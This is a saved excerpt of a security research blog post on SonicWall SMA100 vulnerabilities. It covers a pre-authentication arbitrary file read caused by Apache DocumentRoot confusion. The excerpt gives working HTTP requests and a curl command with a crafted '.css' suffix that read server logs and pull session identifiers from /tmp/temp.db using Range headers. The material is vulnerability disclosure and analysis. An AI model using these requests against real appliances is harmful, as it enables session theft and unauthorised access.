---
author: Sina Kheirkhah (@SinSinology)
aliases:
  - From Stolen Tokens to Remote Shells - SonicWall SMA100
tags:
  - readwise/articles
url: https://labs.watchtowr.com/sonicboom-from-stolen-tokens-to-remote-shells-sonicwall-sma100-cve-2023-44221-cve-2024-38475/?__readwiseLocation=
date: 2025-05-08
summary: SonicWall systems have vulnerabilities that can be exploited, including arbitrary file reading and command injection. Researchers demonstrated how attackers could gain unauthorized access to sensitive information and escalate their control over affected devices. These vulnerabilities have been added to the list of known exploited vulnerabilities by CISA, highlighting their seriousness.
---
# SonicBoom, From Stolen Tokens to Remote Shells - SonicWall SMA100

![rw-book-cover](https://labs.watchtowr.com/content/images/2025/05/sonicwall-sma.png)

We’re excited to share our previously private analysis of the [now exploited in-the-wild N-day vulnerabilities affecting SonicWall’s SMA100 appliance](https://www.bleepingcomputer.com/news/security/sonicwall-sma100-vpn-vulnerabilities-now-exploited-in-attacks/?ref=labs.watchtowr.com). [](https://read.readwise.io/read/01jtgmd05xqtcs0qv5e90prybt)

Specifically, today, we’re going to be analyzing and reproducing:
- **CVE-2024-38475** - Apache HTTP Pre-Authentication Arbitrary File Read [^1], discovered by Orange Tsai [](https://read.readwise.io/read/01jtgmd5x7ej03fnnmm7e8c4a6)
- **CVE-2023-44221** - Post-Authentication Command Injection, discovered by "Wenjie Zhong (H4lo) Webin lab of DBappSecurity Co., Ltd” [](https://read.readwise.io/read/01jtgmdamdctbe8dgp9e6c5170)

## DocumentRoot Confusion (Arbitrary File Read)
The first step we’re going to take is reviewing the Apache configuration file, named `httpd.conf`. This file contains the configuration settings and rewrite rules used by SonicWall: `/usr/src/EasyAccess/www/conf/httpd.conf` [](https://read.readwise.io/read/01jtgme2vy2av36qny01zx4tda)

We will focus on the relevant rules to this vulnerability. [](https://read.readwise.io/read/01jtgmf0r5s18s7q5qgqp1mpm0) There are many `RewriteRule` entries in the configuration.
However, we are particularly interested in the ones that don’t bind us to any specific paths — specifically, the rules that allow access to the **root** of the filesystem.

Quickly, we can identify that such a rule does exist within this Apache `httpd.conf` config file: [](https://read.readwise.io/read/01jtgmfas3bnrfedyw4wh07wq7)
```
RewriteRule ^/(.+)\\.[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+[A-Za-z0-9]*-[0-9]+.*\\.css$ /$1.css
```

What does a normal, valid request that satisfies this pattern look like?
Here is a valid example: https://host/static/css/85.368e547a156e93679310.css

When the above URL is accessed, the file `85.368e547a156e93679310.css` is successfully retrieved and presented to the user. [](https://read.readwise.io/read/01jtgmgcp1t3v4dxzkh0g62wc2)

However, as we mentioned at the beginning of this blog, Orange Tsai discovered that if the substitution path in a `RewriteRule` statement includes a prefix pointing to the root of the filesystem, Apache will attempt to access two paths. [^2] [](https://read.readwise.io/read/01jtgmjgtn005z1179x6wzy9e6)

When we access: https://host/static/css/85.368e547a156e93679310.css

Apache will try to resolve both of the following paths:  [](https://read.readwise.io/read/01jtgmjyv23bvsbnfhyejmagc5)
- `/85.368e547a156e93679310.css`
- `/usr/src/EasyAccess/www/htdocs/static/css/85.368e547a156e93679310.css`

If there is a file located at `/tmp/secret.txt`, we can read it by sending the following request: https://host/tmp/secret.txt%3f.1.1.1.1a-1.css [](https://read.readwise.io/read/01jtgmm9x13hvjamz20e9yhw5v)


This allows us to quickly demonstrate our ability to **read any file** readable by the user who runs the webserver process (in this case `nobody` user), by targeting a typical Apache HTTP log file.

For the purpose of this example, we’ll target the file `/mnt/ram/var/log/httpd.log` by sending the following HTTP request: [](https://read.readwise.io/read/01jtgmn3gmvg2dd9qkbfasapvj)
```http
GET /mnt/ram/var/log/httpd.log%3f.1.1.1.1a-1.css HTTP/1.1
Host: host 
```

The following response is returned: [](https://read.readwise.io/read/01jtgmnbqxm9m2x31cgdrk5fbn)
```html
HTTP/1.1 200 OK
Server: SonicWALL SSL-VPN Web Server
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'; object-src 'self'; style-src 'self' 'unsafe-inline'
Content-Length: 2593
Content-Type: text/plain

[Wed Apr 30 08:48:03.733994 2025] [:notice] [pid 2476] ModSecurity for Apache/2.6.8 (<http://www.modsecurity.org/>) configured.
[Wed Apr 30 08:48:03.734068 2025] [:notice] [pid 2476] ModSecurity: APR compiled version="1.6.5"; loaded version="1.6.5"
[Wed Apr 30 08:48:03.734153 2025] [:notice] [pid 2476] ModSecurity: PCRE compiled version="8.32 "; loaded version="8.32 2012-11-30"
[Wed Apr 30 08:48:03.734155 2025] [:notice] [pid 2476] ModSecurity: LIBXML compiled version="2.7.8"
[Wed Apr 30 08:48:03.751992 2025] [:notice] [pid 2477] mod_antiloris 0.4 started
[Wed Apr 30 08:48:03.755098 2025] [core:warn] [pid 2477] AH00098: pid file /usr/src/EasyAccess/var/logs/httpd.pid overwritten -- Unclean shutdown of previous Apache run?
[Wed Apr 30 08:48:03.944222 2025] [mpm_prefork:notice] [pid 2477] AH00163: Apache/2.4.38 (Unix) OpenSSL/1.1.1t mod_wsgi/4.5.24 Python/3.6 configured -- resuming normal operations
```

### Escalating Arbitrary File Read

We identified the file `/tmp/temp.db` - this is a SQLite database that contains a significant amount of information, but most importantly, it contains *session identifiers* for currently active sessions - jackpot. [](https://read.readwise.io/read/01jtgmpgn9vsfhjkv7exf6ksx3)

Given we can read arbitrary files, surely the next step is to just exfiltrate this database as so:
`curl https://host/tmp/temp.db%3f.1.1.1.1a-1.css -o temp.db`

Happy with our progress, we loaded our newly downloaded SQLite database file into our local DB viewer and revisited the `Sessions` table. To our surprise, the `Sessions` table was empty. [](https://read.readwise.io/read/01jtgmsrmh0p15k71a73w8sb1z)

Curiously, *sometimes* we would get a SQLite database with real content, and other times we wouldn’t. [](https://read.readwise.io/read/01jtgmt7wg0b4nhpmwr6t61b0f)

Suddenly, we had an idea - what if, instead of downloading the entire file in a single request, we retrieved it **chunk by chunk**?

Apache, by default, supports the `Range` header — and here’s an example of it in action, specifically requesting the byte range that we know our session ID and other important information is stored: [](https://read.readwise.io/read/01jtgmv19k3234qvd553tjw3q6)
```http
GET /tmp/temp.db%3f.1.1.1.1a-1.css HTTP/1.1
Host: host
Range: bytes=7875-8000
```

This turned out to be reliable and stable. [](https://read.readwise.io/read/01jtgmvbpk8h0p3y05f57ppmp4)

[^1]: [🍊 Orange Tsai - Confusion Attacks Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!](🍊%20Orange%20Tsai%20-%20Confusion%20Attacks%20Exploiting%20Hidden%20Semantic%20Ambiguity%20in%20Apache%20HTTP%20Server!.md)

[^2]: [🔥 2. DocumentRoot Confusion](🍊%20Orange%20Tsai%20-%20Confusion%20Attacks%20Exploiting%20Hidden%20Semantic%20Ambiguity%20in%20Apache%20HTTP%20Server!.md#🔥%202.%20DocumentRoot%20Confusion)
